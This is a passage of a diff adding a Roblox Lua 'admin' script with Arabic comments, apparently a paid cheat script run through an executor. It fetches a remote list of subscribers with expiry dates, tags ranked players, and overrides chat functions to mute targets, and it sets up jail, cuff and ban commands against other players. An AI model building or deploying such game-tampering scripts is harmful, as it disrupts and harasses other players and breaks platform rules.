@@ -1,0 +1,2734 @@
+-- ===== نظام الأدمن الكامل المعدل =====
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+local RunService = game:GetService("RunService")
+local Debris = game:GetService("Debris")
+local StarterGui = game:GetService("StarterGui")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+
+local ADMINS_JSON_URL = "https://raw.githubusercontent.com/Client-dotcom/Admins/main/admins%20(1)%20(1).json"
+local MAX_MESSAGES = 250
+local ALLOW_PARTIAL_MATCH = true
+local SCREAM_IMAGE_ID = "rbxassetid://12723744729"
+
+local RESTRICTED_PLACE_IDS = {11379739543, 98752102030179}
+
+-- ===== دالة التحقق من تاريخ الصلاحية =====
+local function checkExpiry(expiryDate)
+    if not expiryDate or expiryDate == "" then
+        return false
+    end
+    
+    if expiryDate:lower() == "permanent" then
+        return true
+    end
+    
+    local year, month, day = expiryDate:match("(%d+)-(%d+)-(%d+)")
+    if not year then
+        return false
+    end
+    
+    local expiryTime = os.time({
+        year = tonumber(year), 
+        month = tonumber(month), 
+        day = tonumber(day), 
+        hour = 23, min = 59, sec = 59
+    })
+    
+    local currentTime = os.time()
+    return expiryTime >= currentTime
+end
+
+local funConn = nil
+local originalWalkSpeed = 16
+local speedConnections = {}
+local cuffsConnections = {}
+local cuffsEffects = {}
+
+local jails = {}
+local JAIL_SETTINGS = {
+    WALL_SIZE = 6, WALL_HEIGHT = 8, WALL_THICKNESS = 0.5,
+    FLOOR_OFFSET = 4, POSTS_COLOR = Color3.fromRGB(200, 0, 0), POSTS_SPACING = 1
+}
+
+-- ===== نظام منع الشات المعدل =====
+local chatBlockers = {}
+local originalChatFunctions = {}
+
+local function blockPlayerChat(targetPlayer)
+    if not targetPlayer or targetPlayer == LocalPlayer then return end
+    
+    if chatBlockers[targetPlayer] then return end
+    
+    chatBlockers[targetPlayer] = {}
+    originalChatFunctions[targetPlayer] = {}
+    
+    -- إخفاء واجهة الشات
+    task.spawn(function()
+        local success, targetGui = pcall(function()
+            return targetPlayer:WaitForChild("PlayerGui", 5)
+        end)
+        
+        if success and targetGui then
+            local chatElements = {"Chat", "ChatBar", "ChatMain", "ChatChannelParent", "ChatWindow"}
+            for _, elementName in pairs(chatElements) do
+                local element = targetGui:FindFirstChild(elementName)
+                if element then
+                    pcall(function() element:Destroy() end)
+                end
+            end
+        end
+    end)
+    
+    -- منع DefaultChatSystemChatEvents
+    task.spawn(function()
+        pcall(function()
+            local defaultChat = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+            if defaultChat then
+                local sayMessage = defaultChat:FindFirstChild("SayMessageRequest")
+                if sayMessage then
+                    originalChatFunctions[targetPlayer].SayMessageRequest = sayMessage.FireServer
+                    sayMessage.FireServer = function(...)
+                        return nil
+                    end
+                end
+            end
+        end)
+    end)
+    
+    -- منع TextChatService
+    task.spawn(function()
+        pcall(function()
+            if TextChatService then
+                if TextChatService.TextChannels then
+                    for _, channel in pairs(TextChatService.TextChannels:GetChildren()) do
+                        if channel:IsA("TextChannel") then
+                            originalChatFunctions[targetPlayer][channel.Name] = channel.SendAsync
+                            channel.SendAsync = function(self, ...)
+                                return nil
+                            end
+                        end
+                    end
+                end
+                
+                local chatWindow = TextChatService:FindFirstChild("ChatWindow")
+                if chatWindow then
+                    chatWindow.Enabled = false
+                end
+            end
+        end)
+    end)
+    
+    -- إخفاء CoreGui Chat
+    pcall(function()
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+    end)
+end
+
+local function unblockPlayerChat(targetPlayer)
+    if not targetPlayer or not chatBlockers[targetPlayer] then return end
+    
+    chatBlockers[targetPlayer] = nil
+    
+    -- استعادة الوظائف الأصلية
+    if originalChatFunctions[targetPlayer] then
+        pcall(function()
+            local defaultChat = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+            if defaultChat and originalChatFunctions[targetPlayer].SayMessageRequest then
+                local sayMessage = defaultChat:FindFirstChild("SayMessageRequest")
+                if sayMessage then
+                    sayMessage.FireServer = originalChatFunctions[targetPlayer].SayMessageRequest
+                end
+            end
+            
+            if TextChatService and TextChatService.TextChannels then
+                for _, channel in pairs(TextChatService.TextChannels:GetChildren()) do
+                    if channel:IsA("TextChannel") and originalChatFunctions[targetPlayer][channel.Name] then
+                        channel.SendAsync = originalChatFunctions[targetPlayer][channel.Name]
+                    end
+                end
+            end
+            
+            local chatWindow = TextChatService:FindFirstChild("ChatWindow")
+            if chatWindow then
+                chatWindow.Enabled = true
+            end
+        end)
+    end
+    
+    originalChatFunctions[targetPlayer] = nil
+    
+    pcall(function()
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
+    end)
+end
+
+-- ===== دالة التحقق وعرض حالة الصلاحية =====
+local function checkAndShowAdminStatus()
+    local success, adminData = pcall(function()
+        local response = game:HttpGet(ADMINS_JSON_URL .. "?t=" .. os.time())
+        return HttpService:JSONDecode(response)
+    end)
+    
+    if not success or not adminData then
+        return
+    end
+    
+    local myName = LocalPlayer.Name
+    local found = false
+    local expiryDate = nil
+    
+    for username, date in pairs(adminData) do
+        if tostring(username):lower() == myName:lower() then
+            found = true
+            expiryDate = date
+            break
+        end
+    end
+    
+    if not found then
+        return -- ليس أدمن
+    end
+    
+    -- ===== الجزء الأول: طباعة في الكونسول =====
+    if expiryDate:lower() == "permanent" then
+        print("✨ بريميوم دائم")
+    else
+        local year, month, day = expiryDate:match("(%d+)-(%d+)-(%d+)")
+        if year then
+            local expiryTime = os.time({
+                year = tonumber(year), 
+                month = tonumber(month), 
+                day = tonumber(day), 
+                hour = 23, min = 59, sec = 59
+            })
+            local currentTime = os.time()
+            local timeDiff = expiryTime - currentTime
+            
+            if timeDiff <= 0 then
+                local daysAgo = math.floor(-timeDiff / 86400)
+                print("❌ صلاحيتك انتهت منذ " .. daysAgo .. " يوم")
+            else
+                local daysLeft = math.floor(timeDiff / 86400)
+                local hoursLeft = math.floor((timeDiff % 86400) / 3600)
+                local minutesLeft = math.floor((timeDiff % 3600) / 60)
+                
+                if daysLeft > 0 then
+                    print("⏳ متبقي " .. daysLeft .. " يوم و " .. hoursLeft .. " ساعة")
+                elseif hoursLeft > 0 then
+                    print("⏳ متبقي " .. hoursLeft .. " ساعة و " .. minutesLeft .. " دقيقة")
+                else
+                    print("⏳ متبقي " .. minutesLeft .. " دقيقة")
+                end
+            end
+        else
+            print("⚠️ خطأ في قراءة تاريخ الصلاحية")
+        end
+    end
+    
+    -- ===== الجزء الثاني: عرض GUI جميل =====
+    local notificationGui = Instance.new("ScreenGui")
+    notificationGui.Name = "AdminStatusNotification"
+    notificationGui.ResetOnSpawn = false
+    notificationGui.Parent = LocalPlayer:FindFirstChild("PlayerGui") or game:GetService("CoreGui")
+    
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Name = "StatusFrame"
+    mainFrame.Size = UDim2.new(0, 320, 0, 150)
+    mainFrame.Position = UDim2.new(1, -340, 0.05, 0)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+    mainFrame.BackgroundTransparency = 0.1
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Parent = notificationGui
+    
+    -- زوايا مستديرة
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 15)
+    corner.Parent = mainFrame
+    
+    -- تأثير ظل
+    local shadow = Instance.new("UIStroke")
+    shadow.Color = Color3.fromRGB(0, 0, 0)
+    shadow.Thickness = 2
+    shadow.Transparency = 0.7
+    shadow.Parent = mainFrame
+    
+    -- إطار داخلي
+    local innerFrame = Instance.new("Frame")
+    innerFrame.Size = UDim2.new(1, -10, 1, -10)
+    innerFrame.Position = UDim2.new(0, 5, 0, 5)
+    innerFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+    innerFrame.BackgroundTransparency = 0.3
+    innerFrame.BorderSizePixel = 0
+    innerFrame.Parent = mainFrame
+    
+    local innerCorner = Instance.new("UICorner")
+    innerCorner.CornerRadius = UDim.new(0, 10)
+    innerCorner.Parent = innerFrame
+    
+    -- عنوان
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 35)
+    title.Position = UDim2.new(0, 0, 0, 5)
+    title.BackgroundTransparency = 1
+    title.Text = "Premium Status 🗓"
+    title.TextColor3 = Color3.fromRGB(255, 215, 0)
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 20
+    title.TextXAlignment = Enum.TextXAlignment.Center
+    title.Parent = innerFrame
+    
+    -- خط تحت العنوان
+    local line = Instance.new("Frame")
+    line.Size = UDim2.new(0.8, 0, 0, 2)
+    line.Position = UDim2.new(0.1, 0, 0, 40)
+    line.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
+    line.BorderSizePixel = 0
+    line.Parent = innerFrame
+    
+    -- نص الحالة
+    local statusText = Instance.new("TextLabel")
+    statusText.Size = UDim2.new(1, -20, 0, 80)
+    statusText.Position = UDim2.new(0, 10, 0, 50)
+    statusText.BackgroundTransparency = 1
+    statusText.Text = ""
+    statusText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    statusText.Font = Enum.Font.Gotham
+    statusText.TextSize = 16
+    statusText.TextWrapped = true
+    statusText.TextXAlignment = Enum.TextXAlignment.Center
+    statusText.TextYAlignment = Enum.TextYAlignment.Center
+    statusText.Parent = innerFrame
+    
+    local message = ""
+    local textColor = Color3.fromRGB(255, 255, 255)
+    
+    if expiryDate:lower() == "permanent" then
+        message = "✨ بريميوم دائم\n\n🎮 صلاحية لا تنتهي"
+        textColor = Color3.fromRGB(0, 255, 150)
+    else
+        local year, month, day = expiryDate:match("(%d+)-(%d+)-(%d+)")
+        if year then
+            local expiryTime = os.time({
+                year = tonumber(year), 
+                month = tonumber(month), 
+                day = tonumber(day), 
+                hour = 23, min = 59, sec = 59
+            })
+            local currentTime = os.time()
+            local timeDiff = expiryTime - currentTime
+            
+            if timeDiff <= 0 then
+                -- صلاحية انتهت
+                local daysAgo = math.floor(-timeDiff / 86400)
+                if daysAgo == 0 then
+                    message = "❌ صلاحيتك انتهت\n\n⏰ اليوم\n⚠️ جدد بريميومك!"
+                elseif daysAgo == 1 then
+                    message = "❌ صلاحيتك انتهت\n\n⏰ منذ يوم واحد\n⚠️ جدد بريميومك!"
+                else
+                    message = "❌ صلاحيتك انتهت\n\n⏰ منذ " .. daysAgo .. " أيام\n⚠️ جدد بريميومك!"
+                end
+                textColor = Color3.fromRGB(255, 80, 80)
+                
+                -- إضافة تأثير اهتزاز للإشعار
+                task.spawn(function()
+                    for i = 1, 4 do
+                        mainFrame.Position = UDim2.new(1, -335, 0.05, 0)
+                        task.wait(0.06)
+                        mainFrame.Position = UDim2.new(1, -340, 0.05, 0)
+                        task.wait(0.06)
+                        mainFrame.Position = UDim2.new(1, -345, 0.05, 0)
+                        task.wait(0.06)
+                        mainFrame.Position = UDim2.new(1, -340, 0.05, 0)
+                        task.wait(0.06)
+                    end
+                end)
+                
+                -- إضافة تأثير وميض
+                task.spawn(function()
+                    for i = 1, 6 do
+                        innerFrame.BackgroundColor3 = Color3.fromRGB(80, 35, 35)
+                        task.wait(0.3)
+                        innerFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+                        task.wait(0.3)
+                    end
+                end)
+            else
+                -- صلاحية لا تزال نشطة
+                local daysLeft = math.floor(timeDiff / 86400)
+                local hoursLeft = math.floor((timeDiff % 86400) / 3600)
+                local minutesLeft = math.floor((timeDiff % 3600) / 60)
+                
+                if daysLeft > 30 then
+                    local monthsLeft = math.floor(daysLeft / 30)
+                    local remainingDays = daysLeft % 30
+                    if monthsLeft == 1 then
+                        message = "✅ صلاحيتك سارية\n\n⏰ متبقي: شهر واحد"
+                        if remainingDays > 0 then
+                            message = message .. " و " .. remainingDays .. " يوم"
+                        end
+                    else
+                        message = "✅ صلاحيتك سارية\n\n⏰ متبقي: " .. monthsLeft .. " أشهر"
+                        if remainingDays > 0 then
+                            message = message .. " و " .. remainingDays .. " يوم"
+                        end
+                    end
+                elseif daysLeft > 0 then
+                    if daysLeft == 1 then
+                        message = "✅ صلاحيتك سارية\n\n⏰ متبقي: يوم واحد"
+                        if hoursLeft > 0 then
+                            message = message .. " و " .. hoursLeft .. " ساعة"
+                        end
+                    else
+                        message = "✅ صلاحيتك سارية\n\n⏰ متبقي: " .. daysLeft .. " أيام"
+                        if hoursLeft > 0 then
+                            message = message .. " و " .. hoursLeft .. " ساعة"
+                        end
+                    end
+                else
+                    -- أقل من يوم
+                    if hoursLeft > 0 then
+                        if hoursLeft == 1 then
+                            message = "⚠️ صلاحيتك تنتهي قريباً\n\n⏰ متبقي: ساعة واحدة"
+                            if minutesLeft > 0 then
+                                message = message .. " و " .. minutesLeft .. " دقيقة"
+                            end
+                        else
+                            message = "⚠️ صلاحيتك تنتهي قريباً\n\n⏰ متبقي: " .. hoursLeft .. " ساعات"
+                            if minutesLeft > 0 then
+                                message = message .. " و " .. minutesLeft .. " دقيقة"
+                            end
+                        end
+                        textColor = Color3.fromRGB(255, 200, 0)
+                    else
+                        -- أقل من ساعة
+                        message = "⚠️ صلاحيتك تنتهي قريباً\n\n⏰ متبقي: " .. minutesLeft .. " دقائق"
+                        textColor = Color3.fromRGB(255, 150, 0)
+                        
+                        -- تأثير للمدة القصيرة
+                        task.spawn(function()
+                            while minutesLeft < 60 and notificationGui.Parent do
+                                statusText.TextColor3 = Color3.fromRGB(255, 150, 0)
+                                task.wait(0.8)
+                                statusText.TextColor3 = Color3.fromRGB(255, 255, 255)
+                                task.wait(0.8)
+                            end
+                        end)
+                    end
+                end
+            end
+        else
+            message = "⚠️ خطأ في قراءة التاريخ"
+            textColor = Color3.fromRGB(255, 100, 100)
+        end
+    end
+    
+    statusText.Text = message
+    statusText.TextColor3 = textColor
+    
+    -- زر إغلاق
+    local closeButton = Instance.new("TextButton")
+    closeButton.Size = UDim2.new(0, 25, 0, 25)
+    closeButton.Position = UDim2.new(1, -30, 0, 5)
+    closeButton.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
+    closeButton.BorderSizePixel = 0
+    closeButton.Text = "✕"
+    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    closeButton.Font = Enum.Font.GothamBold
+    closeButton.TextSize = 16
+    closeButton.Parent = innerFrame
+    
+    local closeCorner = Instance.new("UICorner")
+    closeCorner.CornerRadius = UDim.new(0, 6)
+    closeCorner.Parent = closeButton
+    
+    closeButton.MouseButton1Click:Connect(function()
+        notificationGui:Destroy()
+    end)
+    
+    -- إغلاق تلقائي
+    if expiryDate:lower() ~= "permanent" then
+        local year, month, day = expiryDate:match("(%d+)-(%d+)-(%d+)")
+        if year then
+            local expiryTime = os.time({
+                year = tonumber(year), 
+                month = tonumber(month), 
+                day = tonumber(day), 
+                hour = 23, min = 59, sec = 59
+            })
+            local currentTime = os.time()
+            local timeDiff = expiryTime - currentTime
+            
+            if timeDiff > 0 then
+                -- صلاحية سارية: إغلاق بعد 10 ثواني
+                task.wait(10)
+                if notificationGui and notificationGui.Parent then
+                    local tween = TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+                        Position = UDim2.new(1, 400, 0.05, 0)
+                    })
+                    tween:Play()
+                    tween.Completed:Wait()
+                    notificationGui:Destroy()
+                end
+            else
+                -- صلاحية منتهية: تبقى 30 ثانية
+                task.wait(20)
+                if notificationGui and notificationGui.Parent then
+                    local tween = TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+                        Position = UDim2.new(1, 400, 0.05, 0)
+                    })
+                    tween:Play()
+                    tween.Completed:Wait()
+                    notificationGui:Destroy()
+                end
+            end
+        end
+    else
+        -- بريميوم دائم: إغلاق بعد 8 ثواني
+        task.wait(8)
+        if notificationGui and notificationGui.Parent then
+            local tween = TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+                Position = UDim2.new(1, 400, 0.05, 0)
+            })
+            tween:Play()
+            tween.Completed:Wait()
+            notificationGui:Destroy()
+        end
+    end
+    
+    -- إظهار الرسالة بتحريكها
+    mainFrame.Position = UDim2.new(1, 400, 0.05, 0)
+    local showTween = TweenService:Create(mainFrame, TweenInfo.new(0.7, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        Position = UDim2.new(1, -340, 0.05, 0)
+    })
+    showTween:Play()
+end
+
+-- استدعاء الدالة بعد تحميل النظام
+task.wait(3.5)
+checkAndShowAdminStatus()
+
+-- ===== جلب الأدمنز =====
+local Admins = {}
+local function loadAdminsFromJSON()
+    local success, result = pcall(function()
+        local response = game:HttpGet(ADMINS_JSON_URL)
+        if response then
+            local adminData = HttpService:JSONDecode(response)
+            if adminData and type(adminData) == "table" then
+                local adminList = {}
+                for username, expiryDate in pairs(adminData) do
+                    if username and username ~= "" and expiryDate and expiryDate ~= "" then
+                        if checkExpiry(expiryDate) then 
+                            table.insert(adminList, username) 
+                        end
+                    end
+                end
+                return adminList
+            end
+        end
+        return {}
+    end)
+    
+    if success then 
+        Admins = result 
+    else 
+        Admins = {"Lol21536544", "Vict0ria_Craze85"} 
+    end
+    return Admins
+end
+
+loadAdminsFromJSON()
+
+-- ===== إعداد الشاشة =====
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "AdminChatOverlay"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = LocalPlayer:FindFirstChild("PlayerGui") or game:GetService("CoreGui")
+
+local frame = Instance.new("Frame", screenGui)
+frame.Name = "BG"
+frame.Size = UDim2.new(0.42,0,0.32,0)
+frame.Position = UDim2.new(0.29,0,0.66,0)
+frame.BackgroundColor3 = Color3.fromRGB(10,10,10)
+frame.BackgroundTransparency = 0.25
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+frame.Visible = false
+
+local scroll = Instance.new("ScrollingFrame", frame)
+scroll.Name = "Messages"
+scroll.Size = UDim2.new(1,-12,1,-40)
+scroll.Position = UDim2.new(0,6,0,34)
+scroll.BackgroundTransparency = 1
+scroll.BorderSizePixel = 0
+scroll.CanvasSize = UDim2.new(0,0,0,0)
+scroll.ScrollBarThickness = 6
+scroll.Visible = false
+
+local uiList = Instance.new("UIListLayout", scroll)
+uiList.SortOrder = Enum.SortOrder.LayoutOrder
+uiList.Padding = UDim.new(0,4)
+
+-- ===== إدارة الرسائل =====
+local messages = {}
+local seenKeys = {}
+local function addMessage(senderName, text)
+    if persistent and persistent.nospeak then 
+        return 
+    end
+    local key = tostring(senderName)..":"..tostring(text)
+    if seenKeys[key] then 
+        return 
+    end
+    seenKeys[key] = true
+
+    local lbl = Instance.new("TextLabel")
+    lbl.Size = UDim2.new(1,-8,0,20)
+    lbl.BackgroundTransparency = 1
+    lbl.TextXAlignment = Enum.TextXAlignment.Left
+    lbl.Font = Enum.Font.Code
+    lbl.TextSize = 16
+    lbl.TextColor3 = Color3.fromRGB(120,255,120)
+    lbl.Text = "["..tostring(senderName).."]: "..tostring(text)
+    lbl.Parent = scroll
+    table.insert(messages, lbl)
+
+    if #messages > MAX_MESSAGES then
+        local old = table.remove(messages,1)
+        if old and old.Parent then 
+            old:Destroy() 
+        end
+    end
+
+    RunService.Heartbeat:Wait()
+    scroll.CanvasSize = UDim2.new(0,0,0,uiList.AbsoluteContentSize.Y)
+    scroll.CanvasPosition = Vector2.new(0, math.max(0, scroll.CanvasSize.Y.Offset - scroll.AbsoluteSize.Y))
+end
+
+-- ===== دوال مساعدة =====
+local function trim(s) 
+    return (s or ""):gsub("^%s*(.-)%s*$","%1") 
+end
+
+local function lower(s) 
+    return (s or ""):lower() 
+end
+
+local function findPlayerByPartial(name)
+    if not name or name == "" then 
+        return nil 
+    end
+    local needle = lower(name)
+    for _, p in ipairs(Players:GetPlayers()) do
+        if lower(p.Name) == needle then 
+            return p 
+        end
+    end
+    for _, p in ipairs(Players:GetPlayers()) do
+        if ALLOW_PARTIAL_MATCH and string.find(lower(p.Name), needle, 1, true) then 
+            return p 
+        end
+    end
+    return nil
+end
+
+local function getHrp(player) 
+    if not player or not player.Character then 
+        return nil 
+    end
+    return player.Character:FindFirstChild("HumanoidRootPart") 
+end
+
+local function getHumanoid(player) 
+    if not player or not player.Character then 
+        return nil 
+    end
+    return player.Character:FindFirstChildOfClass("Humanoid") 
+end
+
+-- ===== دالة التحقق من رتبة الأدمن (جديدة) =====
+local function getAdminRank(playerName)
+    -- تحقق من الأدمن الافتراضيين
+    if playerName:lower() == "lol21536544" or playerName:lower() == "vict0ria_craze85" then
+        return "owner"
+    end
+    
+    -- تحقق من JSON
+    local success, adminData = pcall(function()
+        local response = game:HttpGet(ADMINS_JSON_URL .. "?t=" .. os.time())
+        return HttpService:JSONDecode(response)
+    end)
+    
+    if success and adminData then
+        for username, expiryDate in pairs(adminData) do
+            local cleanUsername = username
+            local hasVipPrefix = false
+            
+            if username:sub(1,1) == "#" then
+                cleanUsername = username:sub(2)
+                hasVipPrefix = true
+            end
+            
+            if playerName:lower() == cleanUsername:lower() then
+                if checkExpiry(expiryDate) then
+                    if hasVipPrefix then
+                        return "owner"  -- تاج OWNER وصلاحيات كاملة
+                    else
+                        return "admin"  -- تاج Admin عادي
+                    end
+                end
+            end
+        end
+    end
+    
+    return nil
+end
+
+-- ===== دوال التحقق من الصلاحيات =====
+local function canUseJailCommand(adminName)
+    local rank = getAdminRank(adminName)
+    return rank == "owner"
+end
+
+local function canUseCuffsCommand(adminName)
+    local rank = getAdminRank(adminName)
+    return rank == "owner"
+end
+
+local function canUseBanCommand(adminName)
+    local rank = getAdminRank(adminName)
+    return rank == "owner"
+end
+
+local function isTargetProtected(targetName)
+    local rank = getAdminRank(targetName)
+    return rank == "owner"
+end
+
+-- ===== نظام التيجان (مع إضافة التحكم في الإظهار/الإخفاء) =====
+local adminTags = {} -- جدول لتخزين التيجان
+local ownerTags = {} -- جدول لتخزين تاج OWNER
+local adminTagConnections = {} -- لتخزين الاتصالات
+local tagVisible = true -- متغير للتحكم في إظهار/إخفاء التاج
+
+local function createOwnerAnimatedTag(player)
+    if not player or not player.Character then return end
+    
+    -- تنظيف التاج القديم إذا موجود
+    if ownerTags[player] then
+        pcall(function()
+            ownerTags[player]:Destroy()
+        end)
+        ownerTags[player] = nil
+    end
+    
+    local head = player.Character:WaitForChild("Head", 3)
+    if not head then return end
+
+    local gui = Instance.new("BillboardGui")
+    gui.Name = "OwnerBillboard_" .. player.UserId
+    gui.Size = UDim2.new(0, 140, 0, 40)
+    gui.StudsOffset = Vector3.new(0, 2.5, 0)
+    gui.AlwaysOnTop = true
+    gui.MaxDistance = 100
+    gui.LightInfluence = 0.5
+    gui.Adornee = head
+    gui.Enabled = tagVisible
+    gui.Parent = game:GetService("CoreGui")
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.fromScale(1,1)
+    frame.BackgroundTransparency = 1
+    frame.Parent = gui
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.fromScale(1,1)
+    label.BackgroundTransparency = 1
+    label.Text = "OWNER"
+    label.TextScaled = true
+    label.RichText = false
+    label.Font = Enum.Font.GothamBold
+    label.TextColor3 = Color3.fromRGB(255,220,90)
+    label.TextStrokeTransparency = 0
+    label.TextStrokeColor3 = Color3.fromRGB(65,40,10)
+    label.TextXAlignment = Enum.TextXAlignment.Center
+    label.TextYAlignment = Enum.TextYAlignment.Center
+    label.Parent = frame
+
+    local shine = Instance.new("UIGradient")
+    shine.Rotation = 18
+    shine.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(170,120,20)),
+        ColorSequenceKeypoint.new(0.35, Color3.fromRGB(255,220,90)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255,255,255)),
+        ColorSequenceKeypoint.new(0.65, Color3.fromRGB(255,220,90)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(170,120,20))
+    }
+    shine.Parent = label
+
+    task.spawn(function()
+        while gui and gui.Parent do
+            for offset = -1,1,0.03 do
+                if not gui or not gui.Parent then break end
+                shine.Offset = Vector2.new(offset,0)
+                task.wait(0.03)
+            end
+        end
+    end)
+
+    local floatOffset = 0
+    local floatDir = 1
+    task.spawn(function()
+        while gui and gui.Parent do
+            floatOffset = floatOffset + 0.01 * floatDir
+            if floatOffset > 0.15 then floatDir = -1 end
+            if floatOffset < -0.15 then floatDir = 1 end
+
+            local shakeX = math.sin(tick()*6)*0.02
+            if gui and gui.Parent then
+                gui.StudsOffset = Vector3.new(shakeX, 2.5 + floatOffset, 0)
+            end
+            task.wait(0.03)
+        end
+    end)
+    
+    ownerTags[player] = gui
+    return gui
+end
+
+local function createAdminTag(player, character)
+    if player == LocalPlayer then 
+        return 
+    end
+    
+    -- تنظيف التاج القديم إذا موجود
+    if adminTags[player] then
+        pcall(function()
+            adminTags[player]:Destroy()
+        end)
+        adminTags[player] = nil
+    end
+    
+    local function addTagToCharacter(char)
+        local head = char:WaitForChild("Head", 5)
+        if not head then return end
+
+        local billboard = Instance.new("BillboardGui")
+        billboard.Name = "AdminTag_" .. player.UserId
+        billboard.Adornee = head
+        billboard.Size = UDim2.new(0, 120, 0, 30)
+        billboard.StudsOffset = Vector3.new(0, 2.6, 0)
+        billboard.AlwaysOnTop = true
+        billboard.Enabled = tagVisible
+        billboard.Parent = game:GetService("CoreGui")
+
+        local text = Instance.new("TextLabel")
+        text.Size = UDim2.new(1, 0, 1, 0)
+        text.BackgroundTransparency = 1
+        text.Font = Enum.Font.GothamSemibold
+        text.TextScaled = true
+        text.TextStrokeTransparency = 0
+        text.Text = "Admin"
+        text.TextColor3 = Color3.fromRGB(255, 255, 255)
+        text.TextStrokeColor3 = Color3.fromRGB(200, 0, 0)
+        text.Parent = billboard
+        
+        adminTags[player] = billboard
+        return billboard
+    end
+    
+    -- إذا الشخصية موجودة الحين
+    if character and character:FindFirstChild("Head") then
+        addTagToCharacter(character)
+    end
+    
+    -- راقب إضافة الشخصية (لما يموت ويرجع)
+    local charConn
+    charConn = player.CharacterAdded:Connect(function(newChar)
+        task.wait(0.5)
+        addTagToCharacter(newChar)
+    end)
+    
+    adminTagConnections[player] = charConn
+end
+
+local function removeAdminTag(player)
+    -- إزالة تاج OWNER
+    if ownerTags[player] then
+        pcall(function()
+            ownerTags[player]:Destroy()
+        end)
+        ownerTags[player] = nil
+    end
+    
+    -- إزالة تاج Admin
+    if adminTags[player] then
+        pcall(function()
+            adminTags[player]:Destroy()
+        end)
+        adminTags[player] = nil
+    end
+    
+    -- تنظيف الاتصال
+    if adminTagConnections and adminTagConnections[player] then
+        pcall(function() adminTagConnections[player]:Disconnect() end)
+        adminTagConnections[player] = nil
+    end
+end
+
+-- ===== دالة للبحث عن Lol21536544 ووضع تاج OWNER عليه =====
+local function findAndTagLol21536544()
+    local lolPlayer = Players:FindFirstChild("Lol21536544")
+    if lolPlayer then
+        if lolPlayer == LocalPlayer then
+            return true
+        end
+        
+        pcall(function()
+            if lolPlayer.Character then
+                createOwnerAnimatedTag(lolPlayer)
+            end
+            
+            local charConn
+            charConn = lolPlayer.CharacterAdded:Connect(function(character)
+                if charConn then 
+                    charConn:Disconnect() 
+                end
+                task.wait(0.5)
+                createOwnerAnimatedTag(lolPlayer)
+            end)
+            
+            local removeConn
+            removeConn = lolPlayer.CharacterRemoving:Connect(function()
+                removeAdminTag(lolPlayer)
+            end)
+        end)
+        
+        return true
+    end
+    return false
+end
+
+-- ===== إعداد اللاعبين =====
+local function setupPlayer(player)
+    local rank = getAdminRank(player.Name)
+    
+    if rank then
+        if rank == "owner" then
+            -- تاج OWNER
+            pcall(function()
+                if player.Character then
+                    createOwnerAnimatedTag(player)
+                end
+                
+                local charConn
+                charConn = player.CharacterAdded:Connect(function(character)
+                    if charConn then charConn:Disconnect() end
+                    task.wait(0.5)
+                    createOwnerAnimatedTag(player)
+                end)
+            end)
+        elseif rank == "admin" then
+            -- تاج Admin عادي
+            pcall(function()
+                if player.Character then
+                    createAdminTag(player, player.Character)
+                end
+                
+                local charConn
+                charConn = player.CharacterAdded:Connect(function(character)
+                    if charConn then charConn:Disconnect() end
+                    task.wait(0.5)
+                    createAdminTag(player, character)
+                end)
+            end)
+        end
+        
+        pcall(function()
+            player.CharacterRemoving:Connect(function() 
+                removeAdminTag(player) 
+            end)
+        end)
+    end
+end
+
+-- ===== تنفيذ التيجان =====
+task.spawn(function()
+    task.wait(3) -- انتظر 3 ثواني
+    
+    -- البحث عن Lol21536544
+    for i = 1, 10 do
+        local found = pcall(function()
+            return findAndTagLol21536544()
+        end)
+        if found then break end
+        task.wait(1)
+    end
+    
+    -- إعداد اللاعبين الحاليين
+    task.wait(1)
+    for _, player in ipairs(Players:GetPlayers()) do 
+        if player ~= LocalPlayer then
+            pcall(function()
+                setupPlayer(player)
+            end)
+        end
+    end
+end)
+
+-- اللاعبين الجدد
+Players.PlayerAdded:Connect(function(player)
+    task.wait(0.5)
+    
+    pcall(function()
+        if player.Name:lower() == "lol21536544" and player ~= LocalPlayer then
+            createOwnerAnimatedTag(player)
+        else
+            setupPlayer(player)
+        end
+    end)
+end)
+
+-- تنظيف عند مغادرة اللاعب
+Players.PlayerRemoving:Connect(function(player)
+    removeAdminTag(player)
+end)
+
+-- تنظيف عند مغادرة اللعبة
+game:GetService("CoreGui").ChildRemoved:Connect(function(child)
+    if child.Name == screenGui.Name then
+        -- تنظيف جميع التيجان
+        for player, tag in pairs(ownerTags) do
+            pcall(function() tag:Destroy() end)
+        end
+        for player, tag in pairs(adminTags) do
+            pcall(function() tag:Destroy() end)
+        end
